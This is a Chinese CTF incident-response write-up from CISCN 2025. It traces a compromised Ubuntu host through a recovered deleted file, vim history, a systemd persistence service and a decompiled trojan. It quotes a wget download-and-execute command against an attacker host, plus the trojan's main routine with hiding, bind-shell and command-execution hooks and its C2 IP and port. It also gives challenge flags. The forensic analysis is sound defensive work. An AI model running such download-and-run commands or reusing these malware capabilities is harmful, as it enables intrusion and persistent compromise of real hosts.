---
title: CISCN x CCB 半决赛 2025 ISW(应急响应)
tags: [ISW, 应急响应, 取证]
categories: CTF
---

# CISCN x CCB 半决赛 2025 ISW(应急响应)

第一次入围CISCN半决赛，学了一周应急匆忙上阵，上午awdp坐牢四小时，下午应急也坐牢四小时，狠狠爆零，log目录翻烂了都没找到IP，还得练。

不知道附件中的入口主机dd镜像.raw有啥用，赛后看了其他队伍的wp才知道可以根据这玩意进行恢复取证分析。

### 题目背景

> ⼩路是⼀名⽹络安全⽹管，据反映发现公司主机上有异常外联信息，据回忆前段时间执⾏过 某些更新脚本（已删除），现在需要协助⼩路同学进⾏⽹络安全应急响应分析，查找⽊⻢， 进⼀步分析，寻找攻击源头，获取攻击者主机权限获取flag⽂件。

### flag1

> 题目描述
>
> 找出主机上**⽊⻢回连**的主控端服务器IP地址（不定时(3~5分钟)周期性），并以 **flag{MD5}**  形式提交，其中MD5加密⽬标的原始字符串格式 **IP:port**

使用取证工具：**RStudioPortable**

工具打开之后，扫描文件所在盘，扫描完成之后，可以看到

![image-20250318095417900](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318095417900.png)

其中Recognized就是工具扫描识别出的分区，找到对应的分区，看到

![image-20250318095519119](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318095519119.png)

首先查看靶机给的Ubuntu用户，raw目录

![image-20250318095712206](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318095712206.png)

发现一个可疑且被删除的文件，**1.txt**，恢复提取查看

```
wget –quiet http://mirror.unknownrepo.net/f/l/a/g/system_upgrade -O /tmp/.system_upgrade && 
chmod +x /tmp/.system_upgrade && /tmp/.system_upgrade
```

有可能时黑客下载病毒文件时所执行的命令，同时在本目录还看到可疑文件**.viminfo**

> **Viminfo**⽂件是Vim编辑器中的⼀个重要⽂件，⽤于保存⽤⼾在退出Vim时的各种状态信 息，以便在⽤⼾再次启动Vim时能够快速恢复这些状态

恢复提取查看

在其中看到了和下载的文件名相同的服务

```
# Jumplist (newest first):
-'  6  0  /etc/systemd/system/system-upgrade.service
|4,39,6,0,1740374317,"/etc/systemd/system/system-upgrade.service"
-'  6  0  /etc/systemd/system/system-upgrade.service
|4,39,6,0,1740374161,"/etc/systemd/system/system-upgrade.service"
-'  5  7  /etc/systemd/system/system-upgrade.service
|4,39,5,7,1740374156,"/etc/systemd/system/system-upgrade.service"
-'  5  7  /etc/systemd/system/system-upgrade.service
|4,39,5,7,1740374156,"/etc/systemd/system/system-upgrade.service"
-'  5  7  /etc/systemd/system/system-upgrade.service
|4,39,5,7,1740374151,"/etc/systemd/system/system-upgrade.service"
-'  1  0  /etc/systemd/system/system-upgrade.service
|4,39,1,0,1740374113,"/etc/systemd/system/system-upgrade.service"
-'  1  0  /etc/systemd/system/system-upgrade.service
|4,39,1,0,1740374113,"/etc/systemd/system/system-upgrade.service"
-'  1  0  /etc/systemd/system/system-upgrade.service
|4,39,1,0,1740374113,"/etc/systemd/system/system-upgrade.service"
```

找到该服务

![image-20250318100355212](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318100355212.png)

右键预览

![image-20250318100428169](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318100428169.png)

可以看到该服务所启动的程序，找到恢复提取，然后用ida反编译

![image-20250318100600123](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318100600123.png)

发现对符号表进行了混淆

![image-20250318100700135](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318100700135.png)

但依旧可以通过字符串找到主函数

```c
__int64 ULRYvXzICzy880dO()
{
  _fentry__();
  Cr8YeLCPy17g2Kqp();
  vH5iRF4rBcsPSxfk();
  QODpPLbPPLRtk397();
  ZRzAVZZOp3EIPba6(&unk_2720);
  XnzbhEaPnydxn1rY("HIDEME", ZRzAVZZOp3EIPba6);
  XnzbhEaPnydxn1rY("SHOWME", bbiVzCN8llELLp6o);
  XnzbhEaPnydxn1rY("HIDE_DENT", Fmk3MFLuFCEiNxgN);
  XnzbhEaPnydxn1rY("SHOW_HIDDEN_DENT", PiCa2rGqFOVs1eiB);
  XnzbhEaPnydxn1rY("HIDE_TCP_PORT", IDZO4NzptW8GaHzj);
  XnzbhEaPnydxn1rY("SHOW_HIDDEN_TCP_PORT", ol186ifyeUPhXKNl);
  XnzbhEaPnydxn1rY("HIDE_TCP_IP", H7XMCPIhJup38DuP);
  XnzbhEaPnydxn1rY("SHOW_HIDDEN_TCP_IP", yiA2lg0kW8v2vOp0);
  XnzbhEaPnydxn1rY("HIDE_UDP_PORT", cuC5zWc4iL4kPgAn);
  XnzbhEaPnydxn1rY("SHOW_HIDDEN_UDP_PORT", LC22j9OZfANw81M7);
  XnzbhEaPnydxn1rY("HIDE_UDP_IP", YlfqRhWLKVqMFbxN);
  XnzbhEaPnydxn1rY("SHOW_HIDDEN_UDP_IP", XBKrkXaghfenXrk6);
  XnzbhEaPnydxn1rY("BINDSHELL_CREATE", NVEKPqx35kIvfacV);
  XnzbhEaPnydxn1rY("RUN_CUSTOM_BASH", T34Z94ahif0BXQRk);
  Fmk3MFLuFCEiNxgN("systemd-agentd");
  Fmk3MFLuFCEiNxgN("system-upgrade");
  Fmk3MFLuFCEiNxgN("system_upgrade");
  IDZO4NzptW8GaHzj("4948");
  IDZO4NzptW8GaHzj("1337");
  H7XMCPIhJup38DuP("192.168.57.203");
  H7XMCPIhJup38DuP("127.0.0.1");
  cuC5zWc4iL4kPgAn("8080");
  return YlfqRhWLKVqMFbxN("127.0.0.1");
}
```

找到了IP和port

**flag{MD5(192.168.57.203:4948)}**

------------------------------------------------------------------------------------------------------------------------------



### flag2

> 找出主机上驻留的**远控⽊⻢⽂件本体**，计算该⽂件的MD5,结果提交形式： flag{md5}

在第一题中ida反编译的结果中就可以找到木马本体

![image-20250318101029728](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318101029728.png)

导出计算文件md5即可

**flag{bccad26b665ca175cd02aca2903d8b1e}**

------------------------------------------------------------------------------------------------------------------------------



### flag3

> 找出主机上加载远控⽊⻢的**持久化程序**（下载者），其功能为下载并执⾏远控⽊⻢，计算该 ⽂件的MD5,结果提交形式： flag{MD5}

这个持久化程序就是我们之前找到的那个服务

**flag{fabe3a89369c56609d2748e5890b21d7}**

------------------------------------------------------------------------------------------------------------------------------



### flag4

> 查找题⽬3中持久化程序（下载者）的**植⼊痕迹**，计算持久化程序植⼊时的原始名称MD5 （仅计算⽂件名称字符串MD5），并提交对应 flag{MD5}

持久化程序的植入痕迹也就是我们在最开始的1.txt中看到的下载指令中的**system_upgrade**

**flag{MD(system_upgrade)}**

------------------------------------------------------------------------------------------------------------------------------



### flag5

> 分析题⽬2中找到的远控⽊⻢，获取⽊⻢通信加密密钥,结果提交形式：flag{ 通信加密 钥 } 

将题目2中得到的文件用ida分析，很显然去符号了，但是依旧可以通过可疑的数组进行定位(这对逆向手不是一眼盯真)

![image-20250318102105359](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318102105359.png)

交叉引用找到引用函数

![image-20250318102141618](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318102141618.png)

就是一个异或

![image-20250318102231539](https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318102231539.png)

**flag{ThIS_1S_th3_S3cR3t_fl@g}**

------------------------------------------------------------------------------------------------------------------------------



### flag6

> 分析题⽬3中持久化程序（下载者），找到攻击者分发远控⽊⻢使⽤的服务器，并获取该服 务器权限，找到flag，结果提交形式： flag{xxxx} 

未能复现，只能等后期看会不会在一些靶场重新上线吧

------------------------------------------------------------------------------------------------------------------------------



### flag7

> 获取题⽬2中找到的远控⽊⻢的主控端服务器权限，查找flag⽂件，结果提交形式： flag{xxxxx}

同上